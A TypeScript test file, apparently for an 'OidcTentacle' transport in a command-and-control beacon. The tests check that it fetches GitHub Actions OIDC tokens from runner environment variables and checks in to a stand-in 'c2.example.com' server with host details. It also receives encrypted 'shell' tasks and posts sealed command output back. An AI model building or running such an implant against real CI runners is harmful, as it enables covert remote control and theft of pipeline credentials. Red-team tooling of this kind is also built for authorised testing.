import { describe, it, expect, mock, beforeEach, afterEach } from "bun:test";

// Mock @octokit/rest before importing anything that imports it
mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest = { repos: { get: mock(async () => ({})) } };
  },
}));

import { OidcTentacle } from "../tentacles/OidcTentacle.ts";
import type { BeaconConfig } from "../types.ts";
import {
  generateKeyPair,
  encryptBox,
  sealBox,
  openSealBox,
  bytesToBase64,
} from "../crypto/sodium.ts";

// ── Helpers ──────────────────────────────────────────────────────────────────

function makeConfig(extra: Partial<BeaconConfig> = {}): BeaconConfig {
  return {
    id: "aaaa1111-bbbb-cccc-dddd-eeeeeeeeeeee",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["oidc"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: new Uint8Array(32),
    beaconKeyPair: { publicKey: new Uint8Array(32), secretKey: new Uint8Array(32) },
    ...extra,
  } as BeaconConfig;
}

const CHECKIN_PAYLOAD = {
  beaconId:  "aaaa1111-bbbb-cccc-dddd-eeeeeeeeeeee",
  publicKey: "",
  hostname:  "runner-host",
  username:  "runner",
  os:        "linux",
  arch:      "x64",
  pid:       1234,
  checkinAt: new Date().toISOString(),
};

// Save and restore env vars around each test
let savedRequestToken: string | undefined;
let savedRequestUrl:   string | undefined;

beforeEach(() => {
  savedRequestToken = process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"];
  savedRequestUrl   = process.env["ACTIONS_ID_TOKEN_REQUEST_URL"];
  delete process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"];
  delete process.env["ACTIONS_ID_TOKEN_REQUEST_URL"];
});

afterEach(() => {
  if (savedRequestToken !== undefined) {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = savedRequestToken;
  } else {
    delete process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"];
  }
  if (savedRequestUrl !== undefined) {
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"] = savedRequestUrl;
  } else {
    delete process.env["ACTIONS_ID_TOKEN_REQUEST_URL"];
  }
});

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("OidcTentacle.isOidcAvailable()", () => {
  it("returns false when both env vars are absent", () => {
    expect(OidcTentacle.isOidcAvailable()).toBe(false);
  });

  it("returns false when only ACTIONS_ID_TOKEN_REQUEST_TOKEN is set", () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "tok_abc";
    expect(OidcTentacle.isOidcAvailable()).toBe(false);
  });

  it("returns false when only ACTIONS_ID_TOKEN_REQUEST_URL is set", () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"] = "https://example.com/oidc";
    expect(OidcTentacle.isOidcAvailable()).toBe(false);
  });

  it("returns true when both env vars are set and non-empty", () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "tok_abc";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://pipelines.actions.githubusercontent.com/oidc";
    expect(OidcTentacle.isOidcAvailable()).toBe(true);
  });

  it("returns false when vars are set to whitespace only", () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "   ";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "   ";
    expect(OidcTentacle.isOidcAvailable()).toBe(false);
  });
});

describe("OidcTentacle.isAvailable()", () => {
  it("returns false when OIDC env vars are absent", async () => {
    const t = new OidcTentacle(makeConfig());
    expect(await t.isAvailable()).toBe(false);
  });

  it("returns true when OIDC env vars are present (delegates to isOidcAvailable)", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "tok_xyz";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://example.com/oidc";
    const t = new OidcTentacle(makeConfig());
    expect(await t.isAvailable()).toBe(true);
  });

  it("returns false (never throws) even when isOidcAvailable would throw", async () => {
    // Temporarily replace the static method to throw
    const orig = OidcTentacle.isOidcAvailable;
    OidcTentacle.isOidcAvailable = () => { throw new Error("simulated failure"); };
    try {
      const t = new OidcTentacle(makeConfig());
      expect(await t.isAvailable()).toBe(false);
    } finally {
      OidcTentacle.isOidcAvailable = orig;
    }
  });
});

describe("OidcTentacle.fetchOidcToken()", () => {
  it("throws when env vars are absent", async () => {
    const t = new OidcTentacle(makeConfig());
    await expect(t.fetchOidcToken()).rejects.toThrow(
      "OidcTentacle: OIDC environment variables are not set"
    );
  });

  it("makes a GET request to the token endpoint with the correct headers and audience", async () => {
    const fakeJwt = "eyJ.fake.jwt";
    const baseUrl = "https://pipelines.actions.githubusercontent.com/_apis/oidc/token";

    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "request-tok-123";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = baseUrl;

    // Mock global fetch
    const mockFetch = mock(async (_url: string, _opts: RequestInit) =>
      new Response(JSON.stringify({ value: fakeJwt }), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      })
    );
    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const t = new OidcTentacle(makeConfig());
      const jwt = await t.fetchOidcToken("test-audience");

      expect(jwt).toBe(fakeJwt);
      expect(mockFetch).toHaveBeenCalledTimes(1);

      const [calledUrl, calledOpts] = mockFetch.mock.calls[0] as [string, RequestInit];

      // URL must contain audience param
      const parsed = new URL(calledUrl);
      expect(parsed.searchParams.get("audience")).toBe("test-audience");

      // Authorization header must carry the request token
      const headers = calledOpts.headers as Record<string, string>;
      expect(headers["Authorization"]).toBe("bearer request-tok-123");
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it("throws when the token endpoint returns a non-2xx status", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://example.com/oidc";

    const mockFetch = mock(async () =>
      new Response("Forbidden", { status: 403 })
    );
    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const t = new OidcTentacle(makeConfig());
      await expect(t.fetchOidcToken()).rejects.toThrow(
        "OidcTentacle: token endpoint returned HTTP 403"
      );
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it("throws when the response body has an unexpected shape", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://example.com/oidc";

    const mockFetch = mock(async () =>
      new Response(JSON.stringify({ result: "nope" }), { status: 200 })
    );
    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const t = new OidcTentacle(makeConfig());
      await expect(t.fetchOidcToken()).rejects.toThrow(
        "OidcTentacle: unexpected token endpoint response shape"
      );
    } finally {
      globalThis.fetch = origFetch;
    }
  });
});

describe("OidcTentacle.checkin()", () => {
  it("POSTs to /api/oidc/checkin with correct body and returns decrypted tasks", async () => {
    // Generate real key pairs
    const operatorKp = await generateKeyPair();
    const beaconKp   = await generateKeyPair();

    // Build a task and encrypt it as the server would
    const task = { taskId: "task-abc", kind: "shell", args: { cmd: "id" }, ref: "task-ab" };
    const { nonce, ciphertext } = await encryptBox(
      JSON.stringify(task),
      beaconKp.publicKey,
      operatorKp.secretKey,
    );

    const fakeJwt        = "eyJ.fake.jwt";
    const serverUrl      = "https://c2.example.com";

    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "req-tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://oidc.example.com/token";

    let capturedBody: unknown = null;
    const mockFetch = mock(async (url: string, opts: RequestInit) => {
      const urlStr = typeof url === "string" ? url : String(url);
      if (urlStr.includes("/token")) {
        // OIDC token fetch
        return new Response(JSON.stringify({ value: fakeJwt }), { status: 200 });
      }
      if (urlStr.includes("/api/oidc/checkin")) {
        capturedBody = JSON.parse(opts.body as string);
        return new Response(JSON.stringify({
          tasks: [{ taskId: task.taskId, nonce, ciphertext }],
        }), { status: 200 });
      }
      return new Response("not found", { status: 404 });
    });

    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const config = makeConfig({
        beaconKeyPair:     beaconKp,
        operatorPublicKey: operatorKp.publicKey,
        serverUrl,
      } as any);
      const t      = new OidcTentacle(config);
      const tasks  = await t.checkin(CHECKIN_PAYLOAD);

      // Should have called fetch twice: once for OIDC token, once for checkin
      expect(mockFetch).toHaveBeenCalledTimes(2);

      // Verify the checkin POST body
      expect((capturedBody as any).jwt).toBe(fakeJwt);
      expect(typeof (capturedBody as any).pubkey).toBe("string");

      // Returned tasks should be the decrypted task
      expect(tasks).toHaveLength(1);
      expect(tasks[0]!.taskId).toBe("task-abc");
      expect(tasks[0]!.kind).toBe("shell");
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it("returns empty array when server returns no tasks", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "req-tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://oidc.example.com/token";

    const mockFetch = mock(async (url: string) => {
      const urlStr = typeof url === "string" ? url : String(url);
      if (urlStr.includes("/token")) {
        return new Response(JSON.stringify({ value: "jwt.fake" }), { status: 200 });
      }
      return new Response(JSON.stringify({ tasks: [] }), { status: 200 });
    });

    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const config = makeConfig({ serverUrl: "https://c2.example.com" } as any);
      const t      = new OidcTentacle(config);
      const tasks  = await t.checkin(CHECKIN_PAYLOAD);
      expect(tasks).toHaveLength(0);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it("throws when serverUrl is not configured", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "req-tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://oidc.example.com/token";

    const t = new OidcTentacle(makeConfig());
    await expect(t.checkin(CHECKIN_PAYLOAD)).rejects.toThrow("serverUrl");
  });
});

describe("OidcTentacle.submitResult()", () => {
  it("POSTs to /api/oidc/result with sealed payload", async () => {
    const operatorKp = await generateKeyPair();
    const beaconKp   = await generateKeyPair();

    const fakeJwt   = "eyJ.result.jwt";
    const serverUrl = "https://c2.example.com";

    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "req-tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://oidc.example.com/token";

    let capturedBody: unknown = null;
    const mockFetch = mock(async (url: string, opts: RequestInit) => {
      const urlStr = typeof url === "string" ? url : String(url);
      if (urlStr.includes("/token")) {
        return new Response(JSON.stringify({ value: fakeJwt }), { status: 200 });
      }
      if (urlStr.includes("/api/oidc/result")) {
        capturedBody = JSON.parse(opts.body as string);
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
      }
      return new Response("not found", { status: 404 });
    });

    const origFetch = globalThis.fetch;
    globalThis.fetch = mockFetch as unknown as typeof fetch;

    try {
      const config = makeConfig({
        beaconKeyPair:     beaconKp,
        operatorPublicKey: operatorKp.publicKey,
        serverUrl,
      } as any);
      const t = new OidcTentacle(config);
      await t.submitResult({
        taskId:      "task-xyz",
        beaconId:    "aaaa1111",
        success:     true,
        output:      "hello",
        completedAt: new Date().toISOString(),
      });

      expect(mockFetch).toHaveBeenCalledTimes(2);

      const body = capturedBody as any;
      expect(body.jwt).toBe(fakeJwt);
      expect(body.taskId).toBe("task-xyz");
      expect(typeof body.sealed).toBe("string");
      expect(body.sealed.length).toBeGreaterThan(0);

      // Verify the sealed payload can be opened with the operator key pair
      const decrypted = await openSealBox(body.sealed, operatorKp.publicKey, operatorKp.secretKey);
      const parsed    = JSON.parse(new TextDecoder().decode(decrypted));
      expect(parsed.taskId).toBe("task-xyz");
      expect(parsed.output).toBe("hello");
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it("throws when serverUrl is not configured", async () => {
    process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = "req-tok";
    process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]   = "https://oidc.example.com/token";

    const t = new OidcTentacle(makeConfig());
    await expect(t.submitResult({
      taskId: "t1", beaconId: "b1", success: true, output: "", completedAt: "",
    })).rejects.toThrow("serverUrl");
  });
});

describe("OidcTentacle.teardown()", () => {
  it("resolves without throwing (no-op)", async () => {
    const t = new OidcTentacle(makeConfig());
    await expect(t.teardown()).resolves.toBeUndefined();
  });
});

describe("OidcTentacle metadata", () => {
  it("kind is 'oidc'", () => {
    const t = new OidcTentacle(makeConfig());
    expect(t.kind).toBe("oidc");
  });
});
